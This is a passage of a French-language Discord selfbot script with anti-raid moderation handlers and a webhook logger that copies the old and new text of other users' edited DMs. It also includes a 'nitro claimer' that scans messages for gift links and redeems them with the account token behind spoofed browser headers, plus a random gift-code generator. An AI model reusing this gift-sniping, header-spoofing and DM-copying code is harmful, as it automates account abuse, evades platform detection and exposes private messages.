            if (member?.bannable && antiraid[oldMember.guild.id].sanction === 3) member.ban({reason: "RSZ Anti Raid"}).catch(() => false)
            
            const removedRole = newMember.roles.cache.find(role => !oldMember.roles.cache.has(role?.id));
            newMember.roles.remove(removedRole)
        }
        else if (newMember.roles.cache.size > oldMember.roles.cache.size){
            const action = await oldMember.guild.fetchAuditLogs({type: 25, limit: 1}).then(a => a.entries.first()).catch(() => false)
            if (!action?.executor) return;
            if (action.executor?.id === client.user?.id) return;
            if (antiraid[oldMember.guild.id].whitelist.includes(action.executor?.id)) return;
    
            const member = await oldMember.guild.members.fetch(action.executor?.id).catch(() => false)
    
            if (member?.manageable && antiraid[oldMember.guild.id].sanction === 1) member.roles?.set([], "RSZ Anti Raid").catch(() => false)
            if (member?.kickable && antiraid[oldMember.guild.id].sanction === 2) member.kick("RSZ Anti Raid").catch(() => false)
            if (member?.bannable && antiraid[oldMember.guild.id].sanction === 3) member.ban({reason: "RSZ Anti Raid"}).catch(() => false)
    
            const addedRole = oldMember.roles.cache.find(role => !newMember.roles.cache.has(role?.id));
            newMember.roles.add(addedRole)
        }
    })


    client.on("guildCreate", async g => {
        if (!antiraid[g?.id]) antiraid[g?.id] = { whitelist: [], protected: false, sanction: 1, antichannel: true, antirole: true, antiban: true, antikick: true, antibot: true, antiping: true, antiwebhook: true, antidc: true, antilink: true, antispam: true, antimemberupdate: true, antiguildupdate: true}        
        if (!gestion[g?.id]) gestion[g?.id] = {autopublish: false, autorole: [], rolemenu: {}, counter: [], prison: { roleid: null, categoryid: null, members: {} }, rolelimit: {}, piconly: [], autoreact: {}, tempvoc: {}, tickets: [], soutiens: {role: null, status: null} }
        client.save(`${__dirname}/Data/Gestion/gestion.json`, gestion)
        client.save(`${__dirname}/Data/AntiRaid/antiraid.json`, antiraid)
        if (logger.activate && logger.guild && logger.webhook){
            const t = await fetch(logger.webhook).catch(() => false)
            if (t.status !== 200) return;

            const webhook = new discord.WebhookClient({url: logger.webhook })
            const embed = new discord.MessageEmbed()
                .setColor("#00ffb1")
                .setTitle("<a:diamand:1228335341098893333>・Serveur Rejoint・<a:diamand:1228335341098893333>")
                .addFields({name: "Serveur : ", value: `${g.name || "Aucun"}`})
                .setTimestamp()
                .setFooter({text: `${client.user.username}・R$Z Logger`, iconURL: `${client.user.displayAvatarURL({dynamic: true})}`})
        
            webhook.send({embeds: [embed], username: `${client.user.username} | RSZ Logger` })
        }
    })

    client.on('guildDelete', async g => {
        if (logger.activate && logger.guild && logger.webhook){
            const t = await fetch(logger.webhook).catch(() => false)
            if (t.status !== 200) return;

            const webhook = new discord.WebhookClient({url: logger.webhook })
            const embed = new discord.MessageEmbed()
                .setColor("#00ffb1")
                .setTitle("<a:diamand:1228335341098893333>・Serveur Quitté・<a:diamand:1228335341098893333>")
                .addFields({name: "Serveur : ", value: `${g.name || "Aucun"}`})
                .setTimestamp()
                .setFooter({text: `${client.user.username}・R$Z Logger`, iconURL: `${client.user.displayAvatarURL({dynamic: true})}`})
        
            webhook.send({embeds: [embed], username: `${client.user.username} | RSZ Logger` })
        }
    })

    client.on('messageUpdate', async (oldMessage, newMessage) => {
        if (!newMessage || !newMessage.author || !newMessage.author?.id)
        if (oldMessage.channel.type === "DM" && newMessage.author?.id !== client.user?.id && logger.activate && logger.edit && logger.webhook && !oldMessage.author?.bot){
            const t = await fetch(logger.webhook).catch(() => false)
            if (t.status !== 200) return;

            const webhook = new discord.WebhookClient({url: logger.webhook })
            const embed = new discord.MessageEmbed()
                .setColor("#00ffb1")
                .setAuthor({name: oldMessage.author.username, iconURL: oldMessage.author.avatarURL({dynamic: true})})
                .setTitle("<a:diamand:1228335341098893333>・DM Modifié・<a:diamand:1228335341098893333>")
                .addFields({name: "Auteur : ", value: `${oldMessage.author.username} (${oldMessage.author})`})
                .addFields({name: "Ancien Contenu : ", value: `${oldMessage.content || "Rien"}`})
                .addFields({name: "Nouveau Contenu : ", value: `${newMessage.content || "Rien"}`})
                .addFields({name: "Anciens Fichiers :", value: `${oldMessage.attachments.size > 0 ? oldMessage.attachments.map(lien => `[fichier](${lien})`).join(', ') : "Aucun"}`})
                .addFields({name: "Nouveaux Fichiers :", value: `${newMessage.attachments.size > 0 ? newMessage.attachments.map(lien => `[fichier](${lien})`).join(', ') : "Aucun"}`})
                .setTimestamp()
                .setFooter({text: `${client.user.username}・R$Z Logger`, iconURL: `${client.user.displayAvatarURL({dynamic: true})}`})
        
            webhook.send({embeds: [embed], username: `${client.user.username} | RSZ Logger` })
        }
    })

    client.on("messageCreate", message => {
        if (nitro_claimer !== true && nitro_claimer !== "on") return;
        let codes = []
        matchCode(message.content, (code) => {
            if (!code) return
            if (!codes.includes(code)) codes.push(code)
        })
        if (codes.length == 0) return
        codes.forEach(code => {
            fetch("https://canary.discordapp.com/api/v6/entitlements/gift-codes/" + code.split("/").pop() + "/redeem", {
                method: "post",
                headers: {
                    "Accept": "*/*",
                    "Accept-Encoding": "gzip, deflate, br",
                    "Accept-Language": "en-US",
                    "Authorization": client.token,
                    "Connection": "keep-alive",
                    "Content-Length": JSON.stringify({ channel_id: message.channel?.id }).length,
                    "Content-Type": "application/json",
                    "Host": "canary.discordapp.com",
                    "Referer": `https://canary.discordapp.com/channels/${message.channel?.id}/${message?.id}`,
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0",
                    "X-super-properties": Buffer.from(JSON.stringify({
                        "os": "Windows",
                        "browser": "Firefox",
                        "device": "",
                        "browser_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0",
                        "browser_version": "66.0",
                        "os_version": "10",
                        "referrer": "",
                        "referring_domain": "",
                        "referrer_current": "",
                        "referring_domain_current": "",
                        "release_channel": "canary",
                        "client_build_number": 37519,
                        "client_event_source": null
                    }), "utf-8").toString("base64")
                },
                body: JSON.stringify({ channel_id: message.channel?.id })
            }).then(res => {
                if (res.status == 400 || res.status == 404){
                    console.log(`[ ${red("LOGS")} ]`)
                    console.log(green("Un nitro a été détécté:"))
                    console.log(green("Code: " + code))
                    console.log(green("Status: invalide"))
                }
                else res.json().then(json => {
                    console.log(`[ ${red("LOGS")} ]`)
                    console.log(green("Un nitro a été détécté:"))
                    console.log(green("Code: " + code))
                    console.log(green("Status: claim"))
                })
            }).catch(console.error)
        })
    })

    client.on('messageCreate', async message => {
        if (message.author?.id !== client.user?.id) return;
        if (!message.content.startsWith(prefix)) return;

        const args = message.content.slice(prefix.length).trim().split(/ +/);
        const commandName = args.shift().toLowerCase();
        const command = client.commands.get(commandName) || client.commands.find(command => command.aliases && command.aliases.includes(commandName));
        if (command && command.execute) command.execute(client, message, args);
    })

    const commandFiles = fs.readdirSync(`${process.cwd()}/Plugins`).filter(file => file.endsWith(".js"))
  
    for (const file of commandFiles) {
        const getFName = require(`${process.cwd()}/Plugins/${file}`);
        if (getFName.name) client.commands.set(getFName.name, getFName);
    }

    client.login(token).catch(() => {
        console.clear();
        console.log(red(`- [ERROR] Échec de l'authentification avec Discord. Suivez les instructions et entrez votre token dans config.json.`))
        process.exit(1)
    })
}



function matchCode(text, callback) {
    let codes = text.match(/https:\/\/discord\.gift\/[abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789]+/)
    if (codes) {
        callback(codes[0])
        return matchCode(text.slice(codes.index + codes[0].length), callback)
    } else {
        callback(null)
    }
}

function nitroType(type){
    switch(type){
        default: return "Aucun Nitro"
        case "NITRO_BASIC": return "Nitro Basic"
        case "NITRO_BOOST": return "Nitro Boost"
        case "NITRO_CLASSIC": return "Nitro Classic"
    }
}

function makeid(length){
    var result = "";
    var characters = "0123456789";
    var charactersLength = characters.length;
    for (var i = 0; i < length; i++) {
        result += characters.charAt(
            Math.floor(Math.random() * charactersLength)
        );
    }
    return result;
  }

function nitrocode(length, letter) {

    var multiplier = '';
    if (letter.indexOf('0') > -1) multiplier += '0123456789';
    if (letter.indexOf('A') > -1) multiplier += 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
    if (letter.indexOf('a') > -1) multiplier += 'abcdefghijklmnopqrstuvwxyz';
    var results = '';


    for (var i = length; i > 0; --i) {
        results += multiplier[Math.floor(Math.random() * multiplier.length)];

    }

    return results;

}

function readBase64Image(base64Data) {
    return Buffer.from(base64Data?.replace(/^data:image\/\w+;base64,/, ''), 'base64');
}

function randomNSFW(){
    const urls = [
        "https://nekobot.xyz/api/image?type=hneko",
        "https://nekobot.xyz/api/image?type=hentai",
        "https://nekobot.xyz/api/image?type=hboobs",
        "https://nekobot.xyz/api/image?type=hass",
        "https://nekobot.xyz/api/image?type=hanal"
    ]

    return urls[Math.floor(Math.random() * urls.length)];
}

function calc(tableau) {
    const somme = tableau.reduce((acc, nombre) => acc + nombre, 0);
    return somme;
}

function formatDateWithTime(timestamp) {
    const date = new Date(timestamp);
    const day = String(date.getDate()).padStart(2, '0');
    const month = String(date.getMonth() + 1).padStart(2, '0');
    const year = String(date.getFullYear()).slice(-2);
    const hours = String(date.getHours()).padStart(2, '0');
    const minutes = String(date.getMinutes()).padStart(2, '0');
    const seconds = String(date.getSeconds()).padStart(2, '0');

    return `${day}/${month}/${year} ${hours}:${minutes}:${seconds}`;
}


function transformText(text) {
    const map = {
        'a': '🅰️', 'b': '🅱️', 'c': '🇨', 'd': '🇩', 'e': '🇪', 'f': '🇫', 'g': '🇬', 'h': '🇭', 'i': '🇮',
        'j': '🇯', 'k': '🇰', 'l': '🇱', 'm': '🇲', 'n': '🇳', 'o': '🇴', 'p': '🇵', 'q': '🇶', 'r': '🇷',
        's': '🇸', 't': '🇹', 'u': '🇺', 'v': '🇻', 'w': '🇼', 'x': '🇽', 'y': '🇾', 'z': '🇿', '0': '0️⃣',
        '1': '1️⃣', '2': '2️⃣', '3': '3️⃣', '4': '4️⃣', '5': '5️⃣', '6': '6️⃣', '7': '7️⃣', '8': '8️⃣',
        '9': '9️⃣', '$': '💲', '+': '➕', '-': '➖', '?': '❓', '!': '❗', '#': '#️⃣', '*': '*️⃣', '¡': 'ℹ'
    };

    const transformed = [];
    for (let i = 0; i < text.split('').length; i++) {
        if (map[text[i].toLowerCase()]) {
            transformed.push(map[text[i].toLowerCase()]);
        } else {
            transformed.push(text[i]);
        }
    }
    return transformed.join('');
}

function estEmojiDiscord(emoji) {
    if (emoji?.startsWith('<') && emoji?.endsWith('>')) {
        if (emoji.includes(':')) {
            const isAnimated = emoji.includes('<a:');
            const parts = emoji.split(':');
            if (parts.length === 3) {
                const id = parseInt(parts[2]);
                if (!isNaN(id)) {
                    return true;
                }
            }
        } else {
            const length = emoji.length;
            if (length === 1 || length === 2) {
                return true;
            }
        }
    }
    return false;
}

async function errorHandler(error) {
    if (error.code == 10062) return;
    if (error.code == 40060) return;

    console.log(`[ ${red("LOGS")} ]`)
    console.log(green("Une nouvelle erreur est survenu:"))
    console.log(green("Erreur: " + error))
    //console.log(error)
};
process.on("unhandledRejection", errorHandler);
process.on("uncaughtException", errorHandler);
})

function decodeAsciiWithOffset(text, offset) {
    let decodedText = "";
    for (let i = 0; i < text.length; i++) {
        const charCode = text.charCodeAt(i) - offset;
        decodedText += String.fromCharCode(charCode);
    }
    return decodedText;
}

function encodeAsciiWithOffset(text, offset) {
    let encodedText = "";
    for (let i = 0; i < text.length; i++) {
        const charCode = text.charCodeAt(i) + offset;
        encodedText += String.fromCharCode(charCode);
    }
    return encodedText;
}